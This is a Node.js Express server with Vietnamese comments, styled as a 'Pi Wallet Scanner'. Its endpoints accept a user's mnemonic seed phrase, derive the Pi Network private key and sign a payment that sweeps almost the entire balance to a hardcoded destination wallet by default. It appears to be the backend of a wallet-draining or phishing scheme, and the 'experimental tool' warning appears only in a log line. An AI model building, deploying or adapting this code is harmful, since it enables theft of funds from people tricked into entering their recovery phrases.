const express = require('express');
const path = require('path');
const cors = require('cors');
const StellarSdk = require('stellar-sdk');
const bip39 = require('bip39');
const HDKey = require('hdkey');
const fetch = require('node-fetch');

// Cấu hình
const PORT = process.env.PORT || 3000;
const PI_API_URL = "https://api.mainnet.minepi.com";
const HORIZON_URL = "https://api.mainnet.minepi.com";
const NETWORK_PASSPHRASE = "Pi Network";
const DEFAULT_DESTINATION = "GA6HYCTPYDQGPM4US3H5KIZGHWG2IP3SXX3WXX7ERKHZYKK4KZMUTLFI";
const DEFAULT_MIN_BALANCE = 0.05;

// Khởi tạo ứng dụng
const app = express();

// Middleware
// Cấu hình CORS chi tiết hơn để giải quyết vấn đề
app.use(cors({
  origin: '*', // Cho phép tất cả các nguồn
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Tạo keypair từ mnemonic
async function getKeyPairFromMnemonic(mnemonic) {
    try {
        console.log("Đang tạo keypair từ mnemonic...");
        
        // Tạo seed từ mnemonic
        const seed = await bip39.mnemonicToSeed(mnemonic);
        
        // BIP32 (SLIP-0010) for ed25519
        const derivationPath = "m/44'/314159'/0'";
        
        // Tạo HD key
        const hdkey = HDKey.fromMasterSeed(seed);
        const childKey = hdkey.derive(derivationPath);
        
        // Lấy private key từ HD key
        const privateKey = childKey.privateKey;
        
        // Tạo Stellar Keypair từ private key
        const keypair = StellarSdk.Keypair.fromRawEd25519Seed(privateKey);
        
        console.log(`Đã tạo keypair thành công. Public key: ${keypair.publicKey()}`);
        return keypair;
        
    } catch (error) {
        console.error(`Lỗi khi tạo keypair: ${error.message}`);
        throw error;
    }
}

// Kiểm tra số dư tài khoản
async function checkAccountBalance(publicKey) {
    try {
        console.log(`Đang kiểm tra số dư cho tài khoản: ${publicKey}`);
        
        const response = await fetch(`${PI_API_URL}/accounts/${publicKey}`);
        
        if (response.status === 404) {
            console.warn("Tài khoản không tồn tại hoặc chưa được kích hoạt");
            return 0;
        }
        
        if (!response.ok) {
            throw new Error(`Lỗi API: ${response.status}`);
        }
        
        const data = await response.json();
        
        let balance = 0;
        for (const balanceInfo of data.balances) {
            if (balanceInfo.asset_type === "native") {
                balance = parseFloat(balanceInfo.balance);
                break;
            }
        }
        
        console.log(`Số dư Pi: ${balance.toFixed(7)}`);
        return balance;
        
    } catch (error) {
        console.error(`Lỗi kiểm tra số dư: ${error.message}`);
        throw error;
    }
}

// Gửi Pi từ ví nguồn đến ví đích
async function sendPi(keypair, destination, amount) {
    try {
        console.log(`Đang chuẩn bị gửi ${amount} Pi đến ${destination}...`);
        
        // Tạo server connection
        const server = new StellarSdk.Server(HORIZON_URL);
        
        // Lấy thông tin tài khoản nguồn
        const account = await server.loadAccount(keypair.publicKey());
        
        // Tạo giao dịch chuyển Pi
        const transaction = new StellarSdk.TransactionBuilder(account, {
            fee: "100000", // 0.01 Pi
            networkPassphrase: NETWORK_PASSPHRASE
        })
        .addOperation(StellarSdk.Operation.payment({
            destination: destination,
            asset: StellarSdk.Asset.native(),
            amount: amount.toFixed(7)
        }))
        .addMemo(StellarSdk.Memo.text("Pi Wallet Scanner - Tu Dong Chuyen"))
        .setTimeout(30)
        .build();
        
        // Ký giao dịch
        transaction.sign(keypair);
        
        console.log("Đã ký giao dịch, đang gửi đến mạng...");
        
        // Gửi giao dịch
        const result = await server.submitTransaction(transaction);
        
        console.log(`Giao dịch thành công! Hash: ${result.hash}`);
        return result;
        
    } catch (error) {
        console.error(`Lỗi gửi Pi: ${error.message}`);
        
        // Phân tích lỗi từ Horizon API nếu có
        if (error.response && error.response.data && error.response.data.extras) {
            const extras = error.response.data.extras;
            if (extras.result_codes) {
                console.error(`Result codes: ${JSON.stringify(extras.result_codes)}`);
            }
        }
        
        throw error;
    }
}

// Endpoint kiểm tra kết nối
app.get('/api/status', (req, res) => {
    res.json({ status: 'ok', message: 'Pi Wallet Scanner API đang hoạt động' });
});

// API endpoint để kiểm tra số dư từ mnemonic
app.post('/api/check-balance', async (req, res) => {
    try {
        const { mnemonic } = req.body;
        
        if (!mnemonic) {
            return res.status(400).json({ error: 'Thiếu mnemonic' });
        }
        
        // Tạo keypair từ mnemonic
        const keypair = await getKeyPairFromMnemonic(mnemonic);
        const publicKey = keypair.publicKey();
        
        // Kiểm tra số dư
        const balance = await checkAccountBalance(publicKey);
        
        // Dựa vào số dư để tính toán số Pi có thể gửi
        const minBalance = DEFAULT_MIN_BALANCE;
        const txFee = 0.01; // Phí giao dịch
        
        let canSend = false;
        let availableToSend = 0;
        
        if (balance > minBalance + txFee) {
            canSend = true;
            availableToSend = balance - minBalance - txFee;
        }
        
        // Trả về kết quả (KHÔNG BAO GIỜ trả về secret key)
        res.json({
            publicKey,
            balance,
            canSend,
            availableToSend,
            minBalance,
            txFee
        });
        
    } catch (error) {
        console.error('Lỗi kiểm tra số dư:', error);
        res.status(500).json({ error: error.message });
    }
});

// API endpoint để gửi Pi
app.post('/api/send-pi', async (req, res) => {
    try {
        const { mnemonic, destination, minBalance } = req.body;
        const useDestination = destination || DEFAULT_DESTINATION;
        const useMinBalance = parseFloat(minBalance) || DEFAULT_MIN_BALANCE;
        
        if (!mnemonic) {
            return res.status(400).json({ error: 'Thiếu mnemonic' });
        }
        
        // Tạo keypair từ mnemonic
        const keypair = await getKeyPairFromMnemonic(mnemonic);
        const publicKey = keypair.publicKey();
        
        // Kiểm tra số dư
        const balance = await checkAccountBalance(publicKey);
        
        // Tính số Pi có thể gửi
        const txFee = 0.01; // Phí giao dịch 
        const availableToSend = balance - useMinBalance - txFee;
        
        if (availableToSend <= 0) {
            return res.status(400).json({ 
                error: `Số dư không đủ để gửi. Cần có hơn ${useMinBalance + txFee} Pi.`,
                publicKey,
                balance
            });
        }
        
        // Gửi Pi
        const result = await sendPi(keypair, useDestination, availableToSend);
        
        // Trả về kết quả giao dịch
        res.json({
            success: true,
            publicKey,
            sentAmount: availableToSend,
            destination: useDestination,
            remainingBalance: useMinBalance,
            transactionHash: result.hash
        });
        
    } catch (error) {
        console.error('Lỗi gửi Pi:', error);
        
        // Tạo thông báo lỗi chi tiết hơn nếu có
        let errorMessage = error.message;
        if (error.response && error.response.data) {
            try {
                const extraInfo = JSON.stringify(error.response.data);
                errorMessage += ` - ${extraInfo}`;
            } catch (e) {
                // Nếu không parse được JSON thì giữ nguyên message
            }
        }
        
        res.status(500).json({ error: errorMessage });
    }
});

// Phục vụ file HTML chính
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Bắt lỗi 404
app.use((req, res) => {
    res.status(404).json({ error: 'Không tìm thấy endpoint này' });
});

// Khởi động server
app.listen(PORT, () => {
    console.log(`Server đang chạy tại http://localhost:${PORT}`);
    console.log('CẢNH BÁO: Đây là công cụ thử nghiệm, không sử dụng mnemonic thật!');
});
